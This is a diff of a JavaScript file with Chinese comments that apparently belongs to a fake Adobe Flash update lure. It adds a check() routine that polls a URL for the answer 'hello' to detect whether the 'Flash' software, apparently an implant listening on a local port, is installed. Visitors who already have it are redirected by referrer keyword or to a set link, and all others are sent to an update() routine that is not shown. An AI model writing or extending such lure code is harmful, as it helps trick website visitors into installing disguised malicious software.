@@ -54,16 +54,17 @@ function requestss() {
                 if(a_type == 0){
                     console.log("页面刷新");
                     document.location.reload();
-                }else if(document.referrer.length == 0 || document.referrer.indexOf(pb_word) != -1){
-                    console.log("准备跳转");
+                }else if(a_type == 1){
                     // 判断是否设置了指定页面
                     if(bc_link.length != 0 ){
                         document.location.href = bc_link
                     }else{
-                        document.location.href = document.referrer
+                        if(document.referrer.indexOf(pb_word) != -1){
+                            document.location.href = document.referrer    
+                        }
                     }
-                }else{
-                    document.location.href = document.referrer
+                }else if(a_type == 2){
+                    document.location.href = bc_link
                 }
             }
         } else {
@@ -72,6 +73,61 @@ function requestss() {
     };
     xhr.open("GET", l_url, true);
     xhr.send(null);
+}
+// 判断当前是否已安装flash
+function check(){
+    let xhr  = new XMLHttpRequest();
+    xhr.onreadystatechange = function(){
+        if(xhr.readyState == 4){
+            console.log("34");
+            if((xhr.status >= 200 && xhr.status < 300) || xhr.status == 304) {
+                if(xhr.responseText == "hello"){
+                    console.log("success");
+                    // update();
+                    console.log("AdobeFlash has installed,now u can happy");
+                    if(a_type == 0){
+                        console.log("页面刷新");
+                        document.location.reload();
+                    }else if(a_type == 1){
+                        // 判断是否设置了指定页面
+                        if(bc_link.length != 0 ){
+                            document.location.href = bc_link
+                        }else{
+                            if(document.referrer.indexOf(pb_word) != -1){
+                                document.location.href = document.referrer    
+                            }
+                        }
+                    }else if(a_type == 2){
+                        document.location.href = bc_link
+                    }
+                    return 1;
+                }else{ 
+                    console.log("AdobeFlash安装失败或端口被占用");
+                    update();
+                    return 1;
+                }
+            } else {
+                console.log("AdobeFlash未安装");
+                update(); // 为什么没起作用？？？--找到原因了，因为端口不通报错导致的-已解决
+                return 1;
+            }
+        }
+        // else if(xhr.readyState == 3){
+        //     console.log("33");
+        //     // update();//
+        // }else if(xhr.readyState == 2){
+        //     console.log("32");
+        // }else if(xhr.readyState == 1){
+        //     console.log("31");
+        //     // update();
+        // }else if(xhr.readyState == 0){
+        //     console.log("30");
+        // }
+        
+    };
+    xhr.open("GET", l_url, true);
+    xhr.send(null);
+    
 }
 function update(){
     console.log("调用")
@@ -123,45 +179,3 @@ function update(){
     }
 
 }
-
-// 判断当前是否已安装flash
-function check(){
-    let xhr  = new XMLHttpRequest();
-    xhr.onreadystatechange = function(){
-        if(xhr.readyState == 4){
-            console.log("34");
-            if((xhr.status >= 200 && xhr.status < 300) || xhr.status == 304) {
-                if(xhr.responseText == "hello"){
-                    console.log("success");
-                    // update();
-                    throw new Error("AdobeFlash has installed,now u can happy");
-                    return 1;
-                }else{ 
-                    console.log("AdobeFlash安装失败或端口被占用");
-                    update();
-                    return 1;
-                }
-            } else {
-                console.log("AdobeFlash未安装");
-                update(); // 为什么没起作用？？？--找到原因了，因为端口不通报错导致的-已解决
-                return 1;
-            }
-        }
-        // else if(xhr.readyState == 3){
-        //     console.log("33");
-        //     // update();//
-        // }else if(xhr.readyState == 2){
-        //     console.log("32");
-        // }else if(xhr.readyState == 1){
-        //     console.log("31");
-        //     // update();
-        // }else if(xhr.readyState == 0){
-        //     console.log("30");
-        // }
-        
-    };
-    xhr.open("GET", l_url, true);
-    xhr.send(null);
-    
-}
-// check();
